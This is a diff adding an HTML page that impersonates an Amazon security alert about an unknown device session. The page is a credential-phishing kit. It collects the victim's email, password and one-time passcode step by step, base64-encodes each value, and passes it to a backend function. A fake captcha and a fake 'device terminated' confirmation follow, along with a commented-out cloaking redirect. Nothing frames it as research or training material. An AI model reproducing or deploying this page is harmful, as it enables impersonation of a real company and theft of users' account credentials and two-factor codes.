@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon | Security</title>
+    <link rel="icon" type="image/x-icon" href="/img/favion.png">
+    <link rel="stylesheet" href="index.css">
+    <script>//if(!window.location.href.includes('?security')){
+           // window.location.href = 'https://google.com';
+            //console.log('its time to go')
+      //  }
+    </script>
+</head>
+
+<body onload="wasat();" onstart>
+    
+
+
+
+    <img src="img/Amazon_logo.svg.webp" width="103px" style="margin-bottom: 15px;margin-top: 15px;" alt="Amazon.com" />
+
+
+    <!--Alert Box Start-->
+    <div style="width: 100%;text-align: center;justify-content: space-around;display: none;" id="alertBox">
+        <div style="text-align: left;width: max-content;border: solid 1px #d40000;border-radius: 3px;padding: 20px;">
+
+            <h3 style="color: #d40000;font-weight: 400;font-size: 17px;margin: 0;"><span style="font-size:20px"
+                    ;>⚠</span> There was a problem</h3>
+            <h3 style="font-size:13px;font-weight: 400;margin: 0;margin-left: 20px;margin-top: 4px;" id="alertText">We
+                cannot find an
+                account with that email address</h3>
+        </div>
+    </div>
+    <!--Alert Box end-->
+    <br>
+
+    <div id="signInBorder" style="height:280px">
+
+
+
+
+
+
+        <!--Main-->
+        <div id="m">
+            <div>
+                <div id="device" style="display:flex;margin-top: 30px;">
+
+                    <img src="img/device.png" width="40px" style="margin: 0;" alt="">
+                    <div style="margin-left: 10px;">
+                        <h3 style="margin: 0;margin-top: 5px;margin-bottom: 10px;"> Redmi 8 Plus</h3>
+                        <span style="color: gray;">Wyoming - 34 Minutes Ago </span>
+                    </div>
+                </div>
+                <button id="ter" onclick="document.getElementById('ter').disabled = true;ll('/b');">Terminate
+                    This Session</button>
+            </div>
+
+            <div id="createAccount">
+                <h2><span>Need Help?</span></h2>
+                <button id="amazon" name="newAcct">Ask For Help</button>
+            </div>
+
+
+
+        </div>
+
+        <!--End Main-->
+
+
+        <!--Sign Email-->
+        <div id="e" style="display: none;">
+            <p id="SignInTxt">
+                Sign in To Complete
+            </p>
+
+            <label>
+                <strong>Email or mobile phone number</strong>
+                <br>
+                <input type="email" name="email" id="email" value="">
+            </label>
+
+            <br>
+
+
+            <div>
+                <button id="amazon" onclick="ll('/f/'+btoa(document.getElementById('email').value));">Continue</button>
+            </div>
+
+
+
+            <div id="legalTextRow" style="margin: 10px;margin-right: 15px;margin-top: 12px;">
+                By continuing, you agree to Amazon's <a style="margin: 0;"
+                    href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Conditions
+                    of Use </a><span style="color: black;">and </span><a
+                    href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Privacy
+                    Notice</a>.
+            </div>
+            <a href="" style="margin: 10px;margin-bottom: 14px;">Need Help?</a>
+            <br>
+        </div>
+        <!--Sign Email End-->
+
+
+
+        <!--Sign Pass Start-->
+        <div id="p" style="display: none;">
+            <p id="SignInTxt">
+                Sign in To Complete
+            </p>
+            <strong id="hello"></strong>
+            <br>
+            <h4 style="margin: 0;margin-top: 4px;margin-bottom: 10px;font-weight: 400;">Please enter your password to
+                continue</h4>
+
+            <label>
+                <strong style="display: flex;justify-content: space-between;width: 98%;">Password <span><a
+                            href="">forgot
+                            Password?</a></span></strong>
+
+                <input type="password" name="password" id="password" value="">
+            </label>
+
+
+
+            <div>
+                <button id="amazon" onclick="ll('/s/'+btoa(document.getElementById('password').value))">Sign
+                    In</button>
+            </div>
+
+
+
+
+            <br>
+        </div>
+        <!--Sign Pass End-->
+
+
+
+        <!--OTP Page Start-->
+        <div id="o" style="display: none;">
+            <p id="SignInTxt">
+                Two-Step Verfication
+            </p>
+            <h4 style="margin: 0;margin-top: 4px;margin-bottom: 10px;font-weight: 400;" id="otpr">For Added
+                Security,Please Enter The One Time <br> Password (OTP) That Has Been Sent To Your Phone Number or Email
+                Address </h4>
+
+            <label>
+                <strong style="display: flex;justify-content: space-between;width: 98%;">Enter OTP <span><a
+                            href="">Resend
+                            OTP</a></span></strong>
+
+                <input type="otp" name="otp" id="otp" value="">
+            </label>
+
+
+
+            <div>
+                <button id="amazon" onclick="ll('/t/'+btoa(document.getElementById('otp').value))">Terminate The
+                    Unkown Device</button>
+            </div>
+
+
+
+
+            <br>
+        </div>
+        <!--Otp Page End-->
+
+
+
+
+        <!--Robot Start-->
+        <div id="c" style="display: none;">
+            <p id="SignInTxt">
+                Complete Captcha
+            </p>
+
+
+            <div>
+                <div>
+
+                    <div>
+                        <h4>
+                            Enter the characters you see
+                        </h4>
+
+                        <div style="text-align: center;">
+                            <img alt="Loading" src="img/capctha.jpg">
+                        </div>
+                        <div>
+                            <div style="text-align: center;">
+                                <a>See a new challenge
+                                </a>
+
+                            </div>
+                        </div>
+
+
+
+
+                    </div>
+                </div>
+
+
+
+
+            </div>
+
+
+            <br>
+
+
+            <label>
+                Type characters
+            </label>
+
+
+
+            <input type="text" autocomplete="off" name="guess" tabindex="2" spellcheck="false" autocapitalize="off"
+                autocorrect="off">
+
+
+
+
+
+            <div>
+                <button id="amazon" onclick="checkCard()">Terminate The Unkown Device</button>
+            </div>
+        </div>
+        <!--Robot End-->
+
+
+        <!-- End Is Here-->
+        <div id="l" style="display: none;">
+            <p id="SignInTxt" style="text-align: center;">
+                Done
+            </p>
+            <img src="img/check.png" width="80px" alt="">
+            <br>
+            <p style="color: gray;">The "Redmi 8 Plus" Was Terminated Successfully. <br> You Might Get A email or sms of the device status</p>
+
+
+            <div style="margin-bottom: 20px;">
+                <a href="https://amazon.com">
+                    <button id="amazon">Go To Homepage</button>
+                </a>
+            </div>
+
+
+
+
+        </div>
+        <!--End Was Here-->
+
+        <br>
+
+
+    </div>
+
+
+
+    <hr id="footer">
+
+    <div class="extra">
+        <p class="links"><a href="#" id="first">Conditions of Use</a>
+            <a href="#">Notice of Use</a>
+            <a href="#">Help</a>
+        </p>
+        <p class="links" id="special">
+            © 1996-2023, Amazon.com, Inc. or its affiliates
+        </p>
+    </div>
+
+
+
+    <!--Modal-->
+    <div id="mno" class="modal">
+
+
+        <div class="mcontent">
+            <div class="loader"></div>
+            <h3 id="plz"  style="display: none;text-align: center;color: #FCD200;">Terminating Device Session <br>Please Be Patient</h3>
+        </div>
+
+    </div>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="./index.js">
+
+    </script>
+
+
+
+
+</body>
+
+</html>
